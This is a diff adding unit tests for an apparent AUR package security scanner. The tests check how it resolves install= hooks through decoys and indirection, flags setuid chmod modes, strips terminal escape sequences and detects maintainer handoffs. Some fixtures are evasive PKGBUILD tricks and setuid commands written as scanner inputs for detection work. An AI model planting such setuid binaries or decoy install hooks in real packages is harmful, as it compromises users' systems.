+        # B6a: the header assignment is unconditional, but a helper may
+        # overwrite it before install= is read. Being unable to prove the
+        # helper's assignment applies is not proof that it is irrelevant.
+        text = ("pkgname=demo\n_hook=decoy-post-install\nchoose() {\n"
+                "  _hook=post-install\n}\npackage() {\n  choose\n"
+                "  install=$_hook\n}\n")
+        self.assertEqual(self.targets(text), ([("$_hook", None)], 0))
+
+    def test_assignment_in_a_sibling_function_is_unresolved(self):
+        # makepkg does call build() before package(), so this one is
+        # conservative rather than a bash result: which siblings ran, and in
+        # what order, is not established by reading the file.
+        text = ("pkgname=demo\nbuild() {\n  _hook=decoy.install\n}\n"
+                "package_demo() {\n  install=$_hook\n}\n")
+        self.assertEqual(self.targets(text), ([("$_hook", None)], 0))
+
+    def test_only_plain_text_trim_patterns_resolve(self):
+        for word in ("${pkgname%%*}.x", "${pkgname%-*}.x", "${pkgname/-bin/}.x", "${pkgname^^}.x"):
+            with self.subTest(word=word):
+                declarations, unaccounted = self.targets(f"pkgname=demo-bin\ninstall={word}\n", name="demo-bin")
+                self.assertTrue(unaccounted or declarations == [(word, None)])
+
+    def test_ambiguous_or_computed_values_are_unresolved(self):
+        cases = [
+            "pkgname=demo\ninstall=${_name}.install\n",
+            "pkgname=demo\n_name=a\n_name=b\ninstall=$_name.install\n",
+            "pkgname=demo\n_name=$(date)\ninstall=$_name.install\n",
+            "pkgname=demo\ninstall=${pkgname%-*}.install\n",
+            'pkgname=demo\ninstall="$(echo post-install)"\n',
+            "pkgname=demo\nlocal pkgname=other\ninstall=$pkgname.install\n",
+        ]
+        for text in cases:
+            with self.subTest(text=text):
+                declarations, _ = self.targets(text)
+                self.assertEqual(len(declarations), 1)
+                self.assertIsNone(declarations[0][1])
+
+    def test_lexing_matters_for_declarations(self):
+        self.assertEqual(self.targets("pkgname=demo\nins\\\ntall=post-install\n"),
+                         ([("post-install", ["post-install"])], 0))
+        self.assertEqual(self.targets("pkgname=demo\ninstall=post-install # the hook\n"),
+                         ([("post-install", ["post-install"])], 0))
+        self.assertEqual(self.targets("pkgname=demo\nmake # then install=x\n"), ([], 0))
+        self.assertEqual(self.targets("pkgname=demo\nsource /dev/stdin <<EOF\ninstall=x\nEOF\n"), ([], 1))
+        self.assertEqual(self.targets("pkgname=demo\n_n=\\\ndemo\ninstall=$_n.install\n"),
+                         ([("$_n.install", ["demo.install"])], 0))
+
+    def test_multiline_pkgname_array_with_comments(self):
+        text = "pkgname=(\n  demo  # main\n  demo-docs\n)\ninstall=$pkgname.install\n"
+        self.assertEqual(self.targets(text, base="bundle"),
+                         ([("$pkgname.install", ["demo-docs.install", "demo.install"])], 0))
+
+    def test_helper_arrays_are_unresolved(self):
+        for assignment in ("_hook=([0]=post-install)", "_hook=({post-,}install)", "_hook=(post-install)"):
+            with self.subTest(assignment=assignment):
+                declarations, _ = self.targets(f"pkgname=demo\n{assignment}\ninstall=$_hook\n")
+                self.assertEqual(declarations, [("$_hook", None)])
+
+    def test_pkgname_array_must_be_plain_and_fully_parsed(self):
+        for assignment in ("pkgname=({demo,demo-docs})", "pkgname=([0]=demo)",
+                           "pkgname=(demo) extra", "pkgname=(demo 'a b')"):
+            with self.subTest(assignment=assignment):
+                declarations, _ = self.targets(f"{assignment}\ninstall=$pkgname.install\n")
+                self.assertEqual(declarations, [("$pkgname.install", None)])
+
+    def test_unfollowable_setters_are_unaccounted(self):
+        cases = [
+            "pkgver=1; install=post-install\n",
+            "printf -v install post-install\n",
+            "declare -n ref=install\n",
+            "install+=.extra\n",
+            'install="post-\ninstall"\n',
+            "read -r install <<< post-install\n",
+            "install[0]=post-install\n",
+        ]
+        for text in cases:
+            with self.subTest(text=text):
+                self.assertGreaterEqual(self.targets("pkgname=demo\n" + text)[1], 1)
+
+    def test_non_setting_lines_are_ignored(self):
+        text = ("pkgname=demo\n# install=old.install\n"
+                'package() {\n  install -Dm644 x "$pkgdir/x"\n  make DESTDIR="$pkgdir" install\n'
+                "  ./configure --enable-install=yes\n  install=\n  install=''\n}\n")
+        self.assertEqual(self.targets(text), ([], 0))
+
+    def test_dotdot_paths_are_kept_as_written(self):
+        self.assertEqual(au.normalize_repo_path("link/../hook"), "link/../hook")
+        self.assertEqual(au.normalize_repo_path("./a//b/./c"), "a/b/c")
+        self.assertEqual(au.srcinfo_install_targets("\tinstall = x/../y\n"), ["x/../y"])
+
+    def test_srcinfo_install_entries(self):
+        srcinfo = "pkgbase = bundle\n\tinstall = post-install\npkgname = demo\n\tinstall = ./docs.install\n"
+        self.assertEqual(au.srcinfo_install_targets(srcinfo), ["docs.install", "post-install"])
+
+
+class InstallCoverageTests(unittest.TestCase):
+    """G2: how each declaration's candidate read statuses become warnings."""
+
+    def aux(self, read=(), skipped=None):
+        files = au.AuxFiles()
+        files.update({path: "" for path in read})
+        files.skipped.update(skipped or {})
+        return files
+
+    def targets_warned(self, declarations, aux_files, srcinfo=(), unaccounted=0):
+        flags = au.install_coverage_flags("demo", declarations, unaccounted, list(srcinfo), aux_files)
+        return [f["desc"] for f in flags]
+
+    def test_read_candidate_with_missing_alternative_is_covered(self):
+        warned = self.targets_warned([("$pkgname", ["demo", "demo-docs"])],
+                                     self.aux(read=["demo"], skipped={"demo-docs": au.MISSING}))
+        self.assertEqual(warned, [])
+
+    def test_refused_candidate_is_warned_even_when_another_was_read(self):
+        warned = self.targets_warned([("$pkgname", ["demo", "demo-docs"])],
+                                     self.aux(read=["demo"], skipped={"demo-docs": "refused: it is a symlink"}))
+        self.assertEqual(len(warned), 1)
+        self.assertIn("install=demo-docs", warned[0])
+        self.assertIn("refused: it is a symlink", warned[0])
+
+    def test_no_candidate_read_is_warned(self):
+        warned = self.targets_warned([("$pkgname", ["demo", "demo-docs"])], self.aux())
+        self.assertEqual(len(warned), 1)
+        self.assertIn("install=$pkgname", warned[0])
+
+    def test_unread_repo_warns_every_declaration(self):
+        warned = self.targets_warned([("post-install", ["post-install"])], None)
+        self.assertEqual(len(warned), 1)
+        self.assertIn("the package repo wasn't read", warned[0])
+
+    def test_unresolved_and_unaccounted_are_warned(self):
+        warned = self.targets_warned([("$_x", None)], self.aux(), unaccounted=2)
+        self.assertEqual(len(warned), 2)
+        self.assertIn("can't be resolved statically", warned[0])
+        self.assertIn("in 2 place(s)", warned[1])
+
+    def test_srcinfo_target_must_be_read(self):
+        self.assertEqual(self.targets_warned([], self.aux(read=["a"]), srcinfo=["a"]), [])
+        warned = self.targets_warned([], self.aux(), srcinfo=["a"])
+        self.assertIn("declared in .SRCINFO", warned[0])
+
+
+class InstallScanReportTests(GitRepoTestCase):
+    """N2 end to end: main() must read and score a declared install script
+    whatever its name, and say so when it couldn't."""
+
+    def _report(self, pkgbuild, files, argv=None, base="demo", links=(),
+                name="demo", pkgbuild_fetchable=True):
+        (self.repo_dir / "PKGBUILD").write_text(pkgbuild)
+        for filename, body in files.items():
+            (self.repo_dir / filename).write_text(body)
+        for filename, target in links:
+            (self.repo_dir / filename).symlink_to(target)
+        self._commit_all()
+        info = dict(ESTABLISHED_INFO, Name=name, PackageBase=base)
+        out = io.StringIO()
+        with contextlib.ExitStack() as stack:
+            stack.enter_context(mock.patch.object(au, "AUR_GIT_URL", self.repo_dir.as_uri()))
+            stack.enter_context(mock.patch.object(au, "fetch_aur_info", return_value={name: info}))
+            stack.enter_context(mock.patch.object(au, "fetch_pkgbuild",
+                                                  return_value=pkgbuild if pkgbuild_fetchable else None))
+            stack.enter_context(mock.patch.object(au, "official_repo_names", return_value=set()))
+            stack.enter_context(mock.patch.object(sys, "argv", ["auracular", *(argv or (name,))]))
+            stack.enter_context(contextlib.redirect_stdout(out))
+            stack.enter_context(quiet())
+            au.main()
+        return out.getvalue()
+
+    def test_extensionless_install_script_is_scanned(self):
+        report = self._report("pkgname=demo\ninstall=post-install\npackage() { :; }\n",
+                              {"post-install": f"post_install() {{\n  {DOWNLOAD}\n}}\n"})
+        self.assertIn(f"post-install: {INTERPRETER_RULE}", report)
+        self.assertIn("HIGH RISK", report)
+
+    def test_split_package_install_script_is_scanned(self):
+        pkgbuild = ("pkgbase=bundle\npkgname=(demo demo-docs)\n"
+                    "package_demo() {\n  install=post-install\n  :\n}\npackage_demo-docs() { :; }\n")
+        report = self._report(pkgbuild, {"post-install": f"post_install() {{\n  {DOWNLOAD}\n}}\n"},
+                              base="bundle")
+        self.assertIn(f"post-install: {INTERPRETER_RULE}", report)
+        self.assertIn("HIGH RISK", report)
+
+    def test_read_clean_install_script_gets_no_unread_warning(self):
+        report = self._report("pkgname=demo\ninstall=demo.install\npackage() { :; }\n",
+                              {"demo.install": "post_install() {\n  echo hello\n}\n"})
+        self.assertNotIn("sets install=", report)
+        self.assertIn("LOW RISK", report)
+
+    def test_missing_install_script_is_reported_unread(self):
+        report = self._report("pkgname=demo\ninstall=post-install\npackage() { :; }\n", {})
+        self.assertIn("sets install=post-install", report)
+        self.assertIn("could not read it", report)
+
+    def test_decoy_file_does_not_satisfy_literal_target(self):
+        report = self._report("pkgname=demo\ninstall='$pkgname'\npackage() { :; }\n",
+                              {"$pkgname": f"post_install() {{\n  {DOWNLOAD}\n}}\n",
+                               "demo": "post_install() { :; }\n"})
+        self.assertIn(f"$pkgname: {INTERPRETER_RULE}", report)
+        self.assertIn("HIGH RISK", report)
+
+    def test_install_after_escaped_brace_is_scanned(self):
+        pkgbuild = "pkgname=(demo)\npackage_demo() {\n  printf \\}\n  install=post-install\n}\n"
+        report = self._report(pkgbuild, {"post-install": f"post_install() {{\n  {DOWNLOAD}\n}}\n"})
+        self.assertIn(f"post-install: {INTERPRETER_RULE}", report)
+        self.assertIn("HIGH RISK", report)
+
+    def test_unfollowable_install_setter_is_warned_and_not_low_risk(self):
+        report = self._report("pkgname=demo\npackage() {\n  printf -v install post-install\n}\n",
+                              {"post-install": "post_install() { :; }\n"})
+        self.assertIn("may set install= in 1 place(s) this scan can't follow", report)
+        self.assertNotIn("LOW RISK", report)
+
+    def test_unresolved_install_is_warned_even_if_files_were_read(self):
+        report = self._report("pkgname=demo\ninstall=${_name}.install\npackage() { :; }\n",
+                              {"demo.install": "post_install() { :; }\n"})
+        self.assertIn("its value can't be resolved statically", report)
+        self.assertNotIn("LOW RISK", report)
+
+    def test_srcinfo_declared_install_script_is_scanned(self):
+        report = self._report("pkgname=demo\npackage() { :; }\n",
+                              {".SRCINFO": ("pkgbase = demo\n\tinstall = hook-script\n"
+                                            "\tsource = http://192.0.2.1/demo.tar.gz\npkgname = demo\n"),
+                               "hook-script": f"post_install() {{\n  {DOWNLOAD}\n}}\n"})
+        self.assertIn(f"hook-script: {INTERPRETER_RULE}", report)
+        self.assertNotIn(".SRCINFO:", report)
+
+    def test_srcinfo_declared_missing_script_is_warned(self):
+        report = self._report("pkgname=demo\npackage() { :; }\n",
+                              {".SRCINFO": "pkgbase = demo\n\tinstall = gone\npkgname = demo\n"})
+        self.assertIn("declared in .SRCINFO", report)
+
+    def test_unavailable_pkgbuild_and_refused_srcinfo_target_both_reported(self):
+        # G1: must not crash, and must keep the missing-PKGBUILD warning.
+        report = self._report("pkgname=demo\n",
+                              {".SRCINFO": "pkgbase = demo\n\tinstall = hook-link\npkgname = demo\n",
+                               "hook": "post_install() { :; }\n"},
+                              links=[("hook-link", "hook")], pkgbuild_fetchable=False)
+        self.assertIn("PKGBUILD could NOT be fetched", report)
+        self.assertIn("sets install=hook-link", report)
+        self.assertIn("refused: it is a symlink (declared in .SRCINFO)", report)
+        self.assertNotIn("LOW RISK", report)
+
+    def test_readable_candidate_does_not_cover_refused_candidate(self):
+        # G2: demo-docs's real script is a refused symlink; a clean file
+        # named after the sibling package must not satisfy the declaration.
+        pkgbuild = ("pkgname=(demo demo-docs)\npackage_demo() { :; }\n"
+                    "package_demo-docs() {\n  install=$pkgname\n}\n")
+        report = self._report(pkgbuild, {"demo": "post_install() { :; }\n",
+                                         "hook": f"post_install() {{\n  {DOWNLOAD}\n}}\n"},
+                              links=[("demo-docs", "hook")], name="demo-docs")
+        self.assertIn("sets install=demo-docs", report)
+        self.assertIn("refused: it is a symlink", report)
+        self.assertNotIn("LOW RISK", report)
+
+    def test_dotdot_path_through_symlinked_directory_reads_the_real_file(self):
+        # B1: link/../hook opens dir/hook (link -> dir/child), not ./hook.
+        (self.repo_dir / "dir" / "child").mkdir(parents=True)
+        (self.repo_dir / "dir" / "child" / "keep").write_text("keep\n")
+        report = self._report("pkgname=demo\ninstall=link/../hook\npackage() { :; }\n",
+                              {"hook": "post_install() { :; }\n",
+                               "dir/hook": f"post_install() {{\n  {DOWNLOAD}\n}}\n",
+                               ".SRCINFO": "pkgbase = demo\n\tinstall = link/../hook\npkgname = demo\n"},
+                              links=[("link", "dir/child")])
+        self.assertIn(f"link/../hook: {INTERPRETER_RULE}", report)
+        self.assertIn("HIGH RISK", report)
+
+    def test_array_helper_decoy_is_not_read_as_the_target(self):
+        # G3: bash gives install the value post-install here, not the
+        # literal "[0]=post-install".
+        report = self._report("pkgname=demo\n_hook=([0]=post-install)\ninstall=$_hook\npackage() { :; }\n",
+                              {"post-install": f"post_install() {{\n  {DOWNLOAD}\n}}\n",
+                               "[0]=post-install": "post_install() { :; }\n"})
+        self.assertIn("its value can't be resolved statically", report)
+        self.assertNotIn("LOW RISK", report)
+
+    def test_no_history_reports_install_script_unread(self):
+        report = self._report("pkgname=demo\ninstall=post-install\npackage() { :; }\n",
+                              {"post-install": f"post_install() {{\n  {DOWNLOAD}\n}}\n"},
+                              argv=("--no-history", "demo"))
+        self.assertIn("could not read it", report)
+        self.assertIn("auxiliary/.install file scanning did not run", report)
+
+
+class GitLogParsingTests(GitRepoTestCase):
+    """N3: an author name containing the old "|" delimiter must not make a
+    commit disappear from history analysis."""
+
+    def _history(self, new_author):
+        base_ts = 1_700_000_000
+        (self.repo_dir / "PKGBUILD").write_text("pkgname=demo\n")
+        self._commit_all(author="Alice Original <alice@old.example>", timestamp=base_ts)
+        self._commit_all(author=new_author, timestamp=base_ts + 399 * 86400)
+        commits, _ = self._clone_and_scan()
+        self.assertIsNotNone(commits, "history unexpectedly unavailable")
+        return commits
+
+    def test_pipe_in_author_name_keeps_commit(self):
+        commits = self._history("Bob | Newcomer <bob@new.example>")
+        self.assertEqual([c[1] for c in commits], ["Alice Original", "Bob | Newcomer"])
+        handoff = au.analyze_maintainer_history(commits)
+        self.assertIsNotNone(handoff)
+        self.assertEqual(handoff["gap_days"], 399)
+
+    def test_log_timeout_keeps_auxiliary_files(self):
+        (self.repo_dir / "demo.install").write_text("post_install() { :; }\n")
+        self._commit_all()
+        real_run = au.subprocess.run
+
+        def log_times_out(args, **kwargs):
+            if "log" in args:
+                raise subprocess.TimeoutExpired(args, kwargs.get("timeout", 15))
+            return real_run(args, **kwargs)
+
+        with mock.patch.object(au.subprocess, "run", side_effect=log_times_out):
+            commits, aux_files = self._clone_and_scan()
+        self.assertIsNone(commits)
+        self.assertIsNotNone(aux_files)
+        self.assertIn("demo.install", aux_files)
+
+    def test_malformed_record_marks_history_incomplete(self):
+        commits, complete = au.parse_git_log("a@x\x00A\x001\nbroken record\n")
+        self.assertEqual(commits, [("a@x", "A", 1)])
+        self.assertFalse(complete)
+
+
+class RpcRowValidationTests(unittest.TestCase):
+    """N5: a success-shaped RPC body with a malformed row must be treated as
+    an unavailable lookup, not crash later or become "not found"."""
+
+    def _lookup(self, row):
+        body = json.dumps({"type": "multiinfo", "results": [row]})
+        with mock.patch.object(au, "http_get", return_value=body), quiet():
+            return au.fetch_aur_info(["demo"])
+
+    def test_malformed_rows_return_none(self):
+        bad_rows = [
+            {"Name": []},
+            {"Version": "1"},
+            {"Name": "demo", "NumVotes": "12"},
+            {"Name": "demo", "NumVotes": True},
+            {"Name": "demo", "Popularity": "high"},
+            {"Name": "demo", "NumVotes": None},
+            {"Name": "demo", "Popularity": None},
+            {"Name": "demo", "Popularity": 10**400},
+            {"Name": "demo", "Popularity": float("nan")},
+            {"Name": "demo", "Popularity": float("inf")},
+            {"Name": "demo", "NumVotes": -1},
+            {"Name": "demo", "FirstSubmitted": 10**20},
+            {"Name": "demo", "OutOfDate": -1},
+            {"Name": "demo", "Maintainer": 5},
+            "not a dict",
+        ]
+        for row in bad_rows:
+            with self.subTest(row=row):
+                self.assertIsNone(self._lookup(row))
+
+    def test_null_optional_fields_are_accepted_and_scorable(self):
+        row = {"Name": "demo", "NumVotes": 3, "Popularity": 0.1, "Maintainer": None,
+               "FirstSubmitted": 1_600_000_000, "OutOfDate": None, "PackageBase": "demo"}
+        result = self._lookup(row)
+        self.assertEqual(result, {"demo": row})
+        score, _ = au.score_package("demo", result["demo"], [], None)
+        self.assertIsInstance(score, int)
+
+
+class ExtractorTests(unittest.TestCase):
+    """R6 across both review rounds: extract_scalar/extract_array/
+    extract_function_body must match the real declaration, not a look-alike
+    substring or a commented-out placeholder."""
+
+    def test_depends_not_matched_inside_makedepends(self):
+        text = "makedepends=(cmake)\ndepends=(glibc)\n"
+        self.assertEqual(au.extract_array(text, "depends"), ["glibc"])
+
+    def test_quoted_brace_does_not_truncate_function_body(self):
+        text = 'package() {\n  printf "}"\n  echo done\n}\n'
+        body = au.extract_function_body(text, "package")
+        self.assertIn("echo done", body)
+
+    def test_split_package_function_found_by_qualified_name(self):
+        text = "package_demo() {\n  echo hi\n}\n"
+        self.assertIsNone(au.extract_function_body(text, "package"))
+        self.assertIsNotNone(au.extract_function_body(text, "package_demo"))
+
+    def test_explain_report_falls_back_to_split_package_function(self):
+        text = "pkgname=(demo)\npackage_demo() {\n  echo hi\n}\n"
+        info = {"Description": "x", "Version": "1", "Maintainer": "m", "URL": "u",
+                "NumVotes": 0, "Popularity": 0.0}
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf):
+            au.print_explain_report("demo", info, text)
+        self.assertIn("package_demo()", buf.getvalue())
+
+    def test_unresolved_variable_source_is_not_called_local(self):
+        host, label = au.source_host("${_url}/archive.tar.gz")
+        self.assertIsNone(host)
+        self.assertIn("can't be statically resolved", label)
+
+    def test_variable_ipv6_host_is_unresolved_not_a_crash(self):
+        host, label = au.source_host("https://[${_ipv6}]/archive.tar.gz")
+        self.assertIsNone(host)
+        self.assertIn("can't be statically resolved", label)
+
+    def test_malformed_literal_url_is_not_a_crash(self):
+        host, label = au.source_host("https://[not-an-address]/archive.tar.gz")
+        self.assertIsNone(host)
+        self.assertIn("malformed", label)
+
+    def test_variable_in_host_is_unresolved(self):
+        host, label = au.source_host("https://${_mirror}/archive.tar.gz")
+        self.assertIsNone(host)
+        self.assertIn("can't be statically resolved", label)
+
+    def test_plain_local_file_source_is_called_local(self):
+        host, label = au.source_host("local-patch.diff")
+        self.assertIsNone(host)
+        self.assertIn("local file bundled", label)
+
+    def test_commented_out_function_does_not_shadow_real_one(self):
+        text = "# package() { printf placeholder; }\npkgname=demo\npackage() {\n  printf actual\n}\n"
+        body = au.extract_function_body(text, "package")
+        self.assertIn("actual", body)
+        self.assertNotIn("placeholder", body)
+
+    def test_commented_out_scalar_does_not_override_real_value(self):
+        text = "# install=old.install\ninstall=new.install\n"
+        self.assertEqual(au.extract_scalar(text, "install"), "new.install")
+
+
+class SanitizeTests(unittest.TestCase):
+    """R7 across both review rounds: strip every control character that
+    could hide or rewrite terminal output, while leaving tab/newline alone."""
+
+    def test_strips_carriage_return(self):
+        self.assertEqual(au.sanitize("before\rafter"), "beforeafter")
+
+    def test_strips_c1_control_block(self):
+        self.assertEqual(au.sanitize("2Jafter"), "2Jafter")
+
+    def test_strips_esc(self):
+        self.assertEqual(au.sanitize("\x1b[2Jafter"), "[2Jafter")
+
+    def test_preserves_tab_and_newline(self):
+        self.assertEqual(au.sanitize("a\tb\nc"), "a\tb\nc")
+
+    def test_none_passes_through_unchanged(self):
+        self.assertIsNone(au.sanitize(None))
+
+
+class SetuidNumericModeTests(unittest.TestCase):
+    """Smaller correction: the numeric setuid/setgid class must cover all of
+    2-7 (it originally skipped 3 and 5)."""
+
+    def test_5755_is_detected(self):
+        flags = au.scan_pkgbuild("chmod 5755 /usr/bin/demo\n")
+        self.assertIn(NUMERIC_SETUID_RULE, [f["desc"] for f in flags])
+
+    def test_3755_is_detected(self):
+        flags = au.scan_pkgbuild("chmod 3755 /usr/bin/demo\n")
+        self.assertIn(NUMERIC_SETUID_RULE, [f["desc"] for f in flags])
+
+    def test_ordinary_0755_has_no_findings(self):
+        self.assertEqual(au.scan_pkgbuild("chmod 0755 /usr/bin/demo\n"), [])
+
+
+class MaintainerHandoffTests(unittest.TestCase):
+    """Deterministic history-based dormancy/handoff detection, using fixed
+    timestamps so results don't depend on when the suite runs."""
+
+    DAY = 86400
+
+    def test_long_dormancy_then_new_maintainer_is_flagged(self):
+        # Distinct domains and dissimilar names so identity_similar treats
+        # these as two different people, not a cosmetic git-config change.
+        commits = [
+            ("alice@old-maintainer.example", "Alice Original", 1_000_000),
+            ("bob@new-owner.example", "Bob Newcomer", 1_000_000 + 200 * self.DAY),
+            ("bob@new-owner.example", "Bob Newcomer", 1_000_000 + 201 * self.DAY),
+        ]
+        handoff = au.analyze_maintainer_history(commits)
+        self.assertIsNotNone(handoff)
+        self.assertEqual(handoff["gap_days"], 200)
+
+    def test_short_gap_between_commits_is_not_a_handoff(self):
+        # Distinct identities (so this exercises the dormancy-threshold
+        # check itself, not identity merging), but only a 10-day gap - well
+        # under DORMANCY_THRESHOLD_DAYS.
+        commits = [
+            ("alice@old-maintainer.example", "Alice Original", 1_000_000),
+            ("bob@new-owner.example", "Bob Newcomer", 1_000_000 + 10 * self.DAY),
+        ]
+        self.assertIsNone(au.analyze_maintainer_history(commits))
+
+    def test_single_maintainer_has_no_handoff(self):
+        commits = [
+            ("a@example.invalid", "A", 1_000_000),
+            ("a@example.invalid", "A", 1_000_000 + 300 * self.DAY),
+        ]
+        self.assertIsNone(au.analyze_maintainer_history(commits))
+
+
+if __name__ == "__main__":
+    unittest.main()
